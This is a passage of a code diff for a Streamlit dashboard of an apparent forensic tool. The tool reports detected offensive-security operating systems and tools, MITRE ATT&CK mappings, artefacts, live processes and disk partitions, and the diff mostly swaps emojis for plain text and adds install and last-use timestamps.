-        if getattr(op, "tails_disk_confirmed", False):
-            st.warning("✔ Tails OS confirmed by disk partition analysis")
-        st.markdown(f"**Package DB:** `{op.pkg_db_type}` — `{op.pkg_db_path or 'N/A'}`")
-        st.progress(int(op.confidence * 100), text=f"Detection Confidence: {op.confidence:.0%}")
-        st.markdown("**Detection Indicators:**")
-        for ind in op.indicators: st.markdown(f"- {ind}")
-    with col2:
-        icon = {"Kali Linux": "🐉", "BlackArch Linux": "🏴", "Tails OS": "👻"}.get(
-            op.os_type.value, "🐧"
-        )
-        st.markdown(
-            f"<div style='font-size:5rem;text-align:center;padding-top:1rem'>{icon}</div>",
-            unsafe_allow_html=True,
-        )
+    st.markdown(f"**OS Type:** `{op.os_type.value}`")
+    if getattr(op, "tails_disk_confirmed", False):
+        st.warning("Tails OS confirmed by disk partition analysis")
+    st.markdown(f"**Package DB:** `{op.pkg_db_type}` - `{op.pkg_db_path or 'N/A'}`")
+    st.progress(int(op.confidence * 100), text=f"Detection Confidence: {op.confidence:.0%}")
+    st.markdown("**Detection Indicators:**")
+    for ind in op.indicators:
+        st.markdown(f"- {ind}")
 
 with tab_tools:
-    st.subheader(f"Detected Tools — {len(tr.detected_tools)} total")
-    method_icons = {"package_db": "📦", "filesystem": "📂", "config": "⚙"}
+    st.subheader(f"Detected Tools - {len(tr.detected_tools)} total")
+    method_icons = {"package_db": "pkg", "filesystem": "fs", "config": "cfg"}
     for risk_key, label, emoji in [
-        ("high_risk",     "High-Risk Offensive Tooling",       "⚠️"),
-        ("anonymization", "Anonymization Infrastructure",      "🕵️"),
-        ("dual_use",      "Dual-Use Cybersecurity Utilities",  "🔧"),
+        ("high_risk",     "High-Risk Offensive Tooling",       "High-Risk"),
+        ("anonymization", "Anonymization Infrastructure",      "Anonymization"),
+        ("dual_use",      "Dual-Use Cybersecurity Utilities",  "Dual-Use"),
     ]:
         tools = tr.by_risk[risk_key]
         if not tools: continue
@@ -752,21 +969,36 @@ with tab_tools:
                     f'<span class="mitre-tag">{t.category}</span>',
                     unsafe_allow_html=True,
                 )
+                import datetime
+                _time_lines = []
+                if t.mtime:
+                    _time_lines.append(
+                        f"Installed: {datetime.datetime.fromtimestamp(t.mtime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                    )
+                else:
+                    _time_lines.append("Installed: -")
+                if t.atime:
+                    _time_lines.append(
+                        f"Last Used: {datetime.datetime.fromtimestamp(t.atime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                    )
+                else:
+                    _time_lines.append("Last Used: -")
                 cd.markdown(
                     f"{method_icons.get(t.detection_method, '')} "
-                    f"<small>{t.detection_method}</small>",
+                    f"<small>{t.detection_method}</small>"
+                    f"<div style='font-size:0.72em;color:#888'>{'<br>'.join(_time_lines)}</div>",
                     unsafe_allow_html=True,
                 )
     if tr.filesystem_hits:
-        with st.expander(f"📂 Non-packaged binary paths ({len(tr.filesystem_hits)})"):
+        with st.expander(f"Non-packaged binary paths ({len(tr.filesystem_hits)})"):
             for p in tr.filesystem_hits:
                 st.code(p, language="bash")
     if tr.config_hits:
-        with st.expander(f"⚙ Configuration traces ({len(tr.config_hits)})"):
+        with st.expander(f"Configuration traces ({len(tr.config_hits)})"):
             for p in tr.config_hits:
                 st.code(p, language="bash")
     if not tr.detected_tools:
-        st.success("✅ No suspicious tools detected.")
+        st.success("No suspicious tools detected.")
 
 with tab_mitre:
     st.subheader("MITRE ATT&CK Coverage")
@@ -781,14 +1013,14 @@ with tab_mitre:
             for e in entries:
                 url = f"https://attack.mitre.org/techniques/{e.technique_id.replace('.', '/')}/"
                 st.markdown(
-                    f"- [`{e.technique_id}`]({url}) **{e.technique_name}** — "
+                    f"- [`{e.technique_id}`]({url}) **{e.technique_name}** - "
                     + ", ".join(f"`{t}`" for t in e.tools)
                 )
     else:
         st.info("No MITRE ATT&CK techniques mapped.")
 
 with tab_artefacts:
-    st.subheader(f"Filesystem Artefacts — {len(op.filesystem_artefacts)} found")
+    st.subheader(f"Filesystem Artefacts - {len(op.filesystem_artefacts)} found")
     if op.filesystem_artefacts:
         risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
         sorted_artefacts = sorted(
@@ -798,13 +1030,13 @@ with tab_artefacts:
         for a in sorted_artefacts:
             level_colour = RISK_COLOURS.get(a.risk_level, "#888")
             with st.expander(
-                f"{RISK_EMOJI.get(a.risk_level, '•')} [{a.risk_level}] {a.path} — {a.artefact_type}"
+                f"{RISK_EMOJI.get(a.risk_level, '*')} [{a.risk_level}] {a.path} - {a.artefact_type}"
             ):
                 st.markdown(a.description)
                 if a.snippet:
                     st.code(a.snippet, language="bash")
     else:
-        st.success("✅ No filesystem artefacts found.")
+        st.success("No filesystem artefacts found.")
 
 with tab_live:
     st.subheader("Live Process Analysis (/proc)")
@@ -815,7 +1047,7 @@ with tab_live:
     else:
         if lr.process_findings:
             for pf in lr.process_findings:
-                with st.expander(f"PID {pf.pid} — {pf.comm}"):
+                with st.expander(f"PID {pf.pid} - {pf.comm}"):
                     if pf.cmdline:
                         st.code(pf.cmdline, language="bash")
                     for note in pf.notes: st.warning(note)
@@ -829,10 +1061,10 @@ with tab_live:
                         for m in pf.suspicious_maps:
                             st.code(m, language="bash")
         else:
-            st.success("✅ No suspicious volatile process indicators found.")
+            st.success("No suspicious volatile process indicators found.")
 
         if lr.suspicious_connections:
-            st.subheader(f"🌐 Suspicious Network Connections ({len(lr.suspicious_connections)})")
+            st.subheader(f"Suspicious Network Connections ({len(lr.suspicious_connections)})")
             conn_data = [
                 {
                     "Protocol": c.protocol.upper(),
@@ -855,11 +1087,11 @@ with tab_disk:
         col_a, col_b, col_c = st.columns(3)
         col_a.metric("Partitions Found",     len(dr.partitions))
         col_b.metric("Encrypted Partitions", len(dr.encrypted_partitions))
-        col_c.metric("TailsData Found",      "Yes ⚠️" if dr.tails_data_found else "No ✅")
+        col_c.metric("TailsData Found",      "Yes" if dr.tails_data_found else "No")
         if dr.partitions:
             st.dataframe(
                 [{"#": p.index, "Label": p.label, "Size (MB)": p.size_mb,
-                  "Encrypted": (p.luks_version if p.has_luks_header else "—"),
+                  "Encrypted": (p.luks_version if p.has_luks_header else "-"),
                   "Risk": p.risk_label, "Note": p.risk_note}
                  for p in dr.partitions],
                 use_container_width=True,
@@ -867,10 +1099,10 @@ with tab_disk:
         for note in dr.notes: st.info(note)
 
 with tab_items:
-    st.subheader(f"All Risk Items — {len(rr.items)}")
+    st.subheader(f"All Risk Items - {len(rr.items)}")
     source_icons = {
-        "tool": "🛠", "process": "⚙", "disk": "💾",
-        "os": "🖥", "artefact": "📄", "network": "🌐", "killchain": "⚔",
+        "tool": "TOOL", "process": "PROC", "disk": "DISK",
+        "os": "OS", "artefact": "FILE", "network": "NET", "killchain": "CHAIN",
     }
     for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
         items = rr.items_by_level.get(level, [])
@@ -881,12 +1113,12 @@ with tab_items:
             expanded=(level in ("CRITICAL", "HIGH")),
         ):
             for item in items:
-                icon = source_icons.get(item.source, "•")
+                icon = source_icons.get(item.source, "*")
                 extra = ""
                 if item.mitre_technique:
-                    extra += f"<br><small>🎯 MITRE: {item.mitre_technique} · {item.mitre_category}</small>"
+                    extra += f"<br><small>MITRE: {item.mitre_technique} | {item.mitre_category}</small>"
                 if item.evidence:
-                    extra += f"<br><small>🔎 {item.evidence}</small>"
+                    extra += f"<br><small>{item.evidence}</small>"
                 st.markdown(
                     f"<div style='border-left:3px solid {c};padding:0.4rem 0.8rem;"
                     f"margin-bottom:0.4rem;background:#fafafa;border-radius:0 4px 4px 0'>"
@@ -899,20 +1131,22 @@ with tab_export:
     st.subheader("Download Reports")
     col_j, col_h = st.columns(2)
     with col_j:
-        st.markdown("**📄 JSON Report**")
-        st.download_button("⬇ Download JSON", data=result.json_report,
+        st.markdown("**JSON Report**")
+        st.download_button("Download JSON", data=result.json_report,
                            file_name="pmgp_report.json", mime="application/json",
                            use_container_width=True)
         with st.expander("Preview JSON (first 3 KB)"):
             st.code(
-                result.json_report[:3000] + ("…" if len(result.json_report) > 3000 else ""),
+                result.json_report[:3000] + ("..." if len(result.json_report) > 3000 else ""),
                 language="json",
             )
     with col_h:
-        st.markdown("**🌐 HTML Report**")
-        st.download_button("⬇ Download HTML", data=result.html_report,
+        st.markdown("**HTML Report**")
+        st.download_button("Download HTML", data=result.html_report,
                            file_name="pmgp_report.html", mime="text/html",
                            use_container_width=True)
-        st.caption("Self-contained HTML — no internet needed to view")
+        st.caption("Self-contained HTML - no internet needed to view")
     if result.json_path: st.success(f"JSON saved: `{result.json_path}`")
     if result.html_path: st.success(f"HTML saved: `{result.html_path}`")
+
+
